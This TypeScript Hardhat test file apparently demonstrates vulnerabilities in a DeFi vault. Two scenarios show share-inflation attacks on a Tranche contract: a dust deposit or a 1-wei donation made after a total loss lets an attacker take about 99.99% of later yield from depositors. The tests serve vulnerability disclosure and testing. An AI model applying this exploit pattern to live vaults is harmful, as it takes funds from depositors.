import {expect} from "chai";
import {ethers, upgrades, network} from "hardhat";
import {parseUnits} from "ethers";
import {
    impersonateAccount,
    setBalance,
    takeSnapshot,
    time,
} from "@nomicfoundation/hardhat-network-helpers";
import type {SnapshotRestorer} from "@nomicfoundation/hardhat-network-helpers";

import {
    IssuanceVault,
    ReservoirUSDC,
    MZUSD,
    IERC20,
    Tranche,
    LossManager,
    PauseManager,
} from "../typechain-types";
import {PauseCategory, grantPausePermissions} from "./helpers/pause";

const MAINNET_USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const USDC_WHALE = "0xffA69C0080582098aF595156240214b742735a5e";

const LOSS_MANAGER_ROLE = 3n;
const BURNER_ROLE = 5n;
const FINALIZER_ROLE = 8n;

const to6 = (v: string | number | bigint) => parseUnits(v.toString(), 6);
const to18 = (v: string | number | bigint) => parseUnits(v.toString(), 18);

const DAY = 24 * 60 * 60;

async function imp(addr: string) {
    await setBalance(addr, to18(10));
    await impersonateAccount(addr);
    return ethers.getSigner(addr);
}

describe("Tranche Scenarios", () => {
    let snapshot: SnapshotRestorer;

    let deployer: any;
    let alice: any;
    let bob: any;
    let carol: any;
    let attacker: any;

    let accessManager: any;
    let pauseManager: PauseManager;
    let usdc: IERC20;
    let usdcTotalSupply: bigint;

    let mzusd: MZUSD;
    let reservoir: ReservoirUSDC;
    let vault: IssuanceVault;

    let tranche: Tranche;
    let lossManager: LossManager;
    let navOracleRef: any;
    let navOracleSigner: any;

    let whale: any;

    let vaultAddr: string;
    let mzusdAddr: string;
    let trancheAddr: string;
    let lossManagerAddr: string;

    before(async () => {
        [deployer, alice, bob, carol, attacker] = await ethers.getSigners();

        usdc = await ethers.getContractAt("IERC20", MAINNET_USDC, deployer);
        usdcTotalSupply = await usdc.totalSupply();
        whale = await imp(USDC_WHALE);
        upgrades.silenceWarnings();
        await network.provider.send("hardhat_setNextBlockBaseFeePerGas", ["0x0"]);

        // --- Deploy core contracts ---
        const AccessManagerFactory = await ethers.getContractFactory("AccessManager", deployer);
        accessManager = await AccessManagerFactory.deploy(deployer.address);
        await accessManager.waitForDeployment();

        const PauseManagerFactory = await ethers.getContractFactory("PauseManager", deployer);
        pauseManager = (await upgrades.deployProxy(PauseManagerFactory, [accessManager.target], {
            kind: "uups",
            initializer: "initialize",
        })) as unknown as PauseManager;

        const ReservoirFactory = await ethers.getContractFactory("ReservoirUSDC", deployer);
        reservoir = (await upgrades.deployProxy(
            ReservoirFactory,
            [accessManager.target, pauseManager.target],
            {
                kind: "uups",
                initializer: "initialize",
                unsafeAllow: ["constructor", "state-variable-immutable"],
                constructorArgs: [MAINNET_USDC],
            }
        )) as unknown as ReservoirUSDC;

        const MZUSDFactory = await ethers.getContractFactory("MZUSD", deployer);
        mzusd = (await upgrades.deployProxy(
            MZUSDFactory,
            [accessManager.target, pauseManager.target, usdcTotalSupply],
            {
                kind: "uups",
                initializer: "initialize",
                unsafeAllow: ["constructor", "state-variable-immutable"],
                constructorArgs: [MAINNET_USDC],
            }
        )) as unknown as MZUSD;
        mzusdAddr = await mzusd.getAddress();

        const VaultFactory = await ethers.getContractFactory("IssuanceVault", deployer);
        vault = (await upgrades.deployProxy(
            VaultFactory,
            [0, bob.address, 0, carol.address], // 0 fees for simplicity
            {
                kind: "uups",
                initializer: "initialize",
                unsafeAllow: ["constructor", "state-variable-immutable"],
                constructorArgs: [mzusdAddr, reservoir.target],
            }
        )) as unknown as IssuanceVault;
        vaultAddr = await vault.getAddress();

        // Deploy tranche with directWithdraw enabled for easy claiming
        const TrancheFactory = await ethers.getContractFactory("Tranche", deployer);
        tranche = (await upgrades.deployProxy(TrancheFactory, [1, 0, "Senior Tranche", "sMZUSD"], {
            kind: "uups",
            initializer: "initialize",
            unsafeAllow: ["constructor", "state-variable-immutable"],
            constructorArgs: [vault.target, true], // directWithdraw enabled
        })) as unknown as Tranche;
        trancheAddr = await tranche.getAddress();

        // Deploy LossManager
        const LossManagerFactory = await ethers.getContractFactory("LossManager", deployer);
        lossManager = (await upgrades.deployProxy(
            LossManagerFactory,
            [0], // maxLossPerTxUSDC = 0 (no limit)
            {
                kind: "uups",
                initializer: "initialize",
                unsafeAllow: ["constructor", "state-variable-immutable"],
                constructorArgs: [vaultAddr],
            }
        )) as unknown as LossManager;
        lossManagerAddr = await lossManager.getAddress();

        // Deploy NavOracle mock
        const MockNavOracleFactory = await ethers.getContractFactory(
            "MockNavOracleAutomationRef",
            deployer
        );
        navOracleRef = await MockNavOracleFactory.deploy(vaultAddr, lossManagerAddr, mzusdAddr);
        await navOracleRef.waitForDeployment();
        navOracleSigner = await imp(navOracleRef.target as string);

        // --- Roles setup ---
        const ADMIN_ROLE = await accessManager.ADMIN_ROLE();
        await grantPausePermissions(accessManager, pauseManager, ADMIN_ROLE);

        // MZUSD roles
        const setVaultSel = mzusd.interface.getFunction("setVault").selector;
        const burnSel = mzusd.interface.getFunction("burn").selector;
        await accessManager.setTargetFunctionRole(mzusdAddr, [setVaultSel], ADMIN_ROLE);
        await accessManager.setTargetFunctionRole(mzusdAddr, [burnSel], BURNER_ROLE);

        // Vault roles
        const distributeSel = vault.interface.getFunction("distributeYield").selector;
        const advanceEpochSel = vault.interface.getFunction("advanceEpoch").selector;
        const registerTrancheSel = vault.interface.getFunction("registerTranche").selector;
        const setTrancheConfigSel = vault.interface.getFunction("setTrancheConfig").selector;
        const setEpochConfigSel = vault.interface.getFunction("setEpochConfig").selector;
        const setVaultLossManagerSel = vault.interface.getFunction("setLossManager").selector;
        const setVaultNavOracleSel = vault.interface.getFunction("setNavOracle").selector;

        await accessManager.setTargetFunctionRole(
            vaultAddr,
            [
                distributeSel,
                registerTrancheSel,
                setTrancheConfigSel,
                setEpochConfigSel,
                setVaultLossManagerSel,
                setVaultNavOracleSel,
            ],
            ADMIN_ROLE
        );
        await accessManager.setTargetFunctionRole(vaultAddr, [advanceEpochSel], LOSS_MANAGER_ROLE);

        // Tranche roles
        const finalizeEpochSel = tranche.interface.getFunction("finalizeEpoch").selector;
        const tSetUnstakeDelaySel = tranche.interface.getFunction("setUnstakeDelayEpochs").selector;
        const tSetDepositLimitsSel = tranche.interface.getFunction("setDepositLimits").selector;
        await accessManager.setTargetFunctionRole(
            trancheAddr,
            [finalizeEpochSel, tSetUnstakeDelaySel, tSetDepositLimitsSel],
            ADMIN_ROLE
        );
        await accessManager.grantRole(FINALIZER_ROLE, deployer, 0);

        // Burner role for tranche (so LossManager can burn via tranche.burnMZUSD → mzusd.burn)
        await accessManager.grantRole(BURNER_ROLE, trancheAddr, 0);

        // LossManager roles
        const applyLossSel = lossManager.interface.getFunction("applyLoss").selector;
        const setMaxSel = lossManager.interface.getFunction("setMaxLossPerTxUSDC").selector;
        await accessManager.setTargetFunctionRole(
            lossManagerAddr,
            [applyLossSel, setMaxSel],
            ADMIN_ROLE
        );
        await accessManager.grantRole(LOSS_MANAGER_ROLE, lossManagerAddr, 0);

        // --- Wire contracts ---
        await mzusd.setVault(vaultAddr);
        await vault.setLossManager(lossManagerAddr);
        await vault.setNavOracle(navOracleRef.target);

        await vault.registerTranche(trancheAddr);
        // Single tranche gets 100% risk premium (10_000 bps)
        await vault.setTrancheConfig(
            [{tranche: trancheAddr, riskPremiumBps: 10_000, enabled: true}],
            [false],
            0
        );

        snapshot = await takeSnapshot();
    });

    afterEach(async () => {
        await snapshot.restore();
    });

    async function mintMZUSDFor(user: any, usdcAmount6: bigint): Promise<bigint> {
        await usdc.connect(whale).transfer(user.address, usdcAmount6);
        await usdc.connect(user).approve(mzusdAddr, usdcAmount6);
        await (await mzusd.connect(user).deposit(usdcAmount6)).wait();
        return mzusd.balanceOf(user.address);
    }

    async function depositMZIntoTranche(user: any, mzAmount18: bigint) {
        await mzusd.connect(user).approve(trancheAddr, mzAmount18);
        await (await tranche.connect(user).deposit(mzAmount18, user.address)).wait();
    }

    describe("Scenario 1: Post-total-loss deposit dilution attack", () => {
        it("attacker deposits 1 wei after total loss to capture yield from next epoch", async () => {
            // ---------------------------------------------------------------
            // Step 1: Users deposit into tranche so totalSupply is ~1e22
            //         1e22 shares ≈ 10,000 MZUSD deposited (shares = assets * 1e3)
            //         10,000 USDC → 10,000 MZUSD → 1e22 shares
            // ---------------------------------------------------------------
            const depositUSDC = to6(10_000);
            const aliceMZ = await mintMZUSDFor(alice, depositUSDC);
            await depositMZIntoTranche(alice, aliceMZ);

            const totalSupplyAfterDeposit = await tranche.totalSupply();
            const totalAssetsAfterDeposit = await tranche.totalAssets();
            expect(totalSupplyAfterDeposit).to.equal(aliceMZ * 1000n); // 1e22
            expect(totalAssetsAfterDeposit).to.equal(aliceMZ);

            // ---------------------------------------------------------------
            // Step 2: LossManager burns ALL MZUSD from tranche → totalAssets=0
            //         applyLoss advances the epoch internally.
            // ---------------------------------------------------------------
            await time.increase(DAY);
            await lossManager.connect(navOracleSigner).applyLoss(depositUSDC);

            const totalAssetsAfterLoss = await tranche.totalAssets();
            const totalSupplyAfterLoss = await tranche.totalSupply();
            expect(totalAssetsAfterLoss).to.equal(0n);
            expect(totalSupplyAfterLoss).to.equal(totalSupplyAfterDeposit); // shares NOT burned

            // ---------------------------------------------------------------
            // Step 3: Attacker deposits minimal MZUSD (1 USDC = 1e12 MZUSD)
            //
            //   ERC4626 virtual-shares formula:
            //     shares = assets * (totalSupply + 10^offset) / (totalAssets + 1)
            //     shares = 1e12 * (1e22 + 1e3) / (0 + 1) ≈ 1e34
            //
            //   Attacker gets ~1e34 shares vs Alice's 1e22 → attacker owns ~99.99%
            // ---------------------------------------------------------------
            const minUSDC = 1n; // 1 wei USDC = 1e12 MZUSD
            const attackerMZ = await mintMZUSDFor(attacker, minUSDC);
            expect(attackerMZ).to.equal(1_000_000_000_000n); // 1e12

            await depositMZIntoTranche(attacker, attackerMZ);

            const attackerShares = await tranche.balanceOf(attacker.address);
            const totalSupplyAfterAttack = await tranche.totalSupply();
            const totalAssetsAfterAttack = await tranche.totalAssets();

            // totalAssets is now non-zero → tranche will receive yield
            expect(totalAssetsAfterAttack).to.equal(attackerMZ);

            // Attacker received massively inflated shares:
            //   shares ≈ 1e12 * 1e22 = 1e34
            const expectedAttackerShares = attackerMZ * totalSupplyAfterLoss; // 1e12 * 1e22 = 1e34
            expect(attackerShares).to.be.closeTo(
                expectedAttackerShares,
                expectedAttackerShares / 1000n
            );

            // Attacker owns ~99.99% of all shares
            const attackerBps = (attackerShares * 10_000n) / totalSupplyAfterAttack;
            expect(attackerBps).to.equal(9999n); // 99.99%

            // ---------------------------------------------------------------
            // Step 4 & 5: Distribute yield — tranche has non-zero totalAssets
            //             so _allocateYieldToTranches no longer skips it.
            //             The tranche receives its full risk premium allocation.
            // ---------------------------------------------------------------
            await time.increase(DAY);

            const yieldUSDC = to6(1_000); // 1,000 USDC yield
            await vault.connect(navOracleSigner).distributeYield(yieldUSDC);

            // Wait for yield to fully stream into NAV
            await time.increase(DAY);

            const totalAssetsAfterYield = await tranche.totalAssets();
            const yieldMZ = yieldUSDC * 1_000_000_000_000n; // 1e12 scale
            // No fees (0 bps), so all yield goes to the tranche
            expect(totalAssetsAfterYield).to.equal(attackerMZ + yieldMZ);

            // ---------------------------------------------------------------
            // Step 6: Attacker captures ~99.99% of the yield
            // ---------------------------------------------------------------
            const attackerRedeemable = await tranche.convertToAssets(attackerShares);
            const attackerProfit = attackerRedeemable - attackerMZ;

            // Attacker captures nearly all of the 1,000 USDC worth of yield
            // with just 0.000001 USDC deposited
            const attackerYieldBps = (attackerProfit * 10_000n) / yieldMZ;
            expect(attackerYieldBps).to.equal(9999n); // ~99.99% of yield

            // Alice — who lost her entire 10,000 USDC principal — gets almost nothing
            const aliceShares = await tranche.balanceOf(alice.address);
            const aliceRedeemable = await tranche.convertToAssets(aliceShares);
            const aliceYieldBps = (aliceRedeemable * 10_000n) / yieldMZ;
            expect(aliceYieldBps).to.be.lte(1n); // ≤ 0.01% of yield

            // Summary: attacker spent 0.000001 USDC, captured ~999.99 USDC of yield
            expect(attackerProfit).to.be.gt((yieldMZ * 9999n) / 10_000n);
        });
    });

    describe("Scenario 2: Donation bypass of totalAssets == 0 guard", () => {
        it("attacker donates 1 wei MZUSD then deposits to capture yield", async () => {
            // ---------------------------------------------------------------
            // Step 1: Users deposit so totalSupply is ~1e22
            // ---------------------------------------------------------------
            const depositUSDC = to6(10_000);
            const aliceMZ = await mintMZUSDFor(alice, depositUSDC);
            await depositMZIntoTranche(alice, aliceMZ);

            const totalSupplyAfterDeposit = await tranche.totalSupply();
            expect(totalSupplyAfterDeposit).to.equal(aliceMZ * 1000n); // 1e22

            // ---------------------------------------------------------------
            // Step 2: Total loss → totalAssets = 0, totalSupply = 1e22
            // ---------------------------------------------------------------
            await time.increase(DAY);
            await lossManager.connect(navOracleSigner).applyLoss(depositUSDC);

            expect(await tranche.totalAssets()).to.equal(0n);
            expect(await tranche.totalSupply()).to.equal(totalSupplyAfterDeposit);

            // ---------------------------------------------------------------
            // Step 3: Attacker donates 1 wei MZUSD via direct ERC-20 transfer
            //         (bypasses deposit, no shares minted, but totalAssets → 1)
            //
            //         This would bypass a hypothetical `require(totalAssets > 0)`
            //         guard on deposits.
            // ---------------------------------------------------------------
            const attackerMZ = await mintMZUSDFor(attacker, 1n); // 1 USDC wei = 1e12 MZUSD
            const donationAmount = 1n; // 1 wei MZUSD

            await mzusd.connect(attacker).transfer(trancheAddr, donationAmount);

            // totalAssets is now 1 (non-zero) — donation bypasses the guard
            expect(await tranche.totalAssets()).to.equal(1n);

            // ---------------------------------------------------------------
            // Step 4: Attacker deposits remaining MZUSD
            //
            //   ERC4626 formula with totalAssets = 1:
            //     shares = assets * (totalSupply + 10^3) / (totalAssets + 1)
            //     shares = (1e12 - 1) * (1e22 + 1e3) / (1 + 1) ≈ 5e33
            //
            //   Still massively inflated vs Alice's 1e22 shares.
            // ---------------------------------------------------------------
            const depositAmount = attackerMZ - donationAmount; // 1e12 - 1
            await depositMZIntoTranche(attacker, depositAmount);

            const attackerShares = await tranche.balanceOf(attacker.address);
            const totalSupplyAfterAttack = await tranche.totalSupply();

            // Attacker owns ~99.98% of all shares (slightly less than scenario 1
            // because denominator is 2 instead of 1, but still dominant)
            const attackerBps = (attackerShares * 10_000n) / totalSupplyAfterAttack;
            expect(attackerBps).to.be.gte(9998n); // ≥ 99.98%

            // ---------------------------------------------------------------
            // Step 5: Distribute yield — tranche is non-zero, receives allocation
            // ---------------------------------------------------------------
            await time.increase(DAY);

            const yieldUSDC = to6(1_000);
            await vault.connect(navOracleSigner).distributeYield(yieldUSDC);

            await time.increase(DAY);

            const yieldMZ = yieldUSDC * 1_000_000_000_000n;

            // ---------------------------------------------------------------
            // Step 6: Attacker still captures nearly all yield
            // ---------------------------------------------------------------
            const attackerRedeemable = await tranche.convertToAssets(attackerShares);
            const attackerCost = depositAmount + donationAmount; // total spent
            const attackerProfit = attackerRedeemable - attackerCost;

            const attackerYieldBps = (attackerProfit * 10_000n) / yieldMZ;
            expect(attackerYieldBps).to.be.gte(9998n); // ≥ 99.98% of yield

            // Alice gets essentially nothing
            const aliceShares = await tranche.balanceOf(alice.address);
            const aliceRedeemable = await tranche.convertToAssets(aliceShares);
            const aliceYieldBps = (aliceRedeemable * 10_000n) / yieldMZ;
            expect(aliceYieldBps).to.be.lte(2n); // ≤ 0.02%

            // Conclusion: a 1-wei donation bypasses the totalAssets == 0 guard
            // and the attack is essentially identical to Scenario 1.
            expect(attackerProfit).to.be.gt((yieldMZ * 9998n) / 10_000n);
        });
    });
});
